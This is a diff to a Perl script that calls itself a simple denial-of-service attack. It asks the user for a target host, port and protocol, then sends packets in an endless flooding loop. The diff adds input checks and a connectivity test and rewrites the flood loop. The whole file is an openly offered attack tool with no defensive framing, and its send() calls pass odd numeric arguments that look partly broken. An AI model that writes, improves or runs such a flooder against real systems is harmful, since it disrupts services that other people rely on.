@@ -1,6 +1,9 @@
 #!/usr/bin/perl
-
+# Simple denial of service attack In Perl Using Socket Module :)
 use IO::Socket;
+use Scalar::Util qw(looks_like_number);
+use Net::Ping;
+
 system("clear || cls");
 #Script Banner================================================================
 print q{
@@ -34,11 +37,11 @@ print "\n===============================";
 print "\n[~] Enter Port: "; # Set Port
 $port = <STDIN>;
 chomp ($port);
-while ($port eq ""){ 
+while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
  print "   [!] Enter PORT?: ";       
  $port = <STDIN>;
  chomp ($port); 
-}
+} 
 print "PORT ==> $port";
 print "\n===============================";
 print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
@@ -52,33 +55,31 @@ while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "Protocol ==> $proto";
 print "\n===============================\n";
 sleep(2);
+# Check Intenret Connection !
+my $check = Net::Ping->new("icmp");
+if (!($check->ping("www.google.com"))){
+	print "\n[!] Error: Please Check Your Internet Connection !!!";
+	exit(1);
+}
 {
 $sock = IO::Socket::INET->new (
         PeerAddr => $host,
         PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Error: Connection Faild To Target[ $host ] !!!\n[!] Please Check Your Intenet Connection !\n[!] OR Mabye The Problem From TARGET Side !\n";
+        Proto => "$proto" ) || die "\n[!] Error: Connection Failed To Target[ $host ] !!!\n[!] Please Check Your TargetIP !";
 }
-
 system("clear || cls");
 print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
 sleep(3);
 
-packets:
+
 while (1) {
-$size = rand() * 8921873 * 99919988;
-print ("  Packets sent: $size\n");
-send($sock, 999999999999999999999999999, $size); 
-packets2:
-$size = rand() * 8921873 * 99919988 * 2;
-print "Flooding:";
-send($sock, 999999999999999999999999999, $size);
-packet3:
-$size = rand() * 8921873 * 99919988 * 2 + 99919988;
-print " (=>$host:$port~$proto<=)";
-send($sock, $size, $size); # Attack start################
-
+  $size = rand() * 8921873 * 99919988;
+  print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
+  send($sock, $size*2, $size*2); 
+  send($sock, $size*3, $size*3);
+  send($sock, $size*4, $size*4);
+  send($sock, $size*999999999,$size*999999999)
 }
-
 ##############################################################
 #####################                #########################
 #####################  END OF SCRIPT #########################
@@ -87,4 +88,3 @@ send($sock, $size, $size); # Attack start################
 #This Script by Oseid Aldary
 #Have a nice day :)
 #GoodBye
-
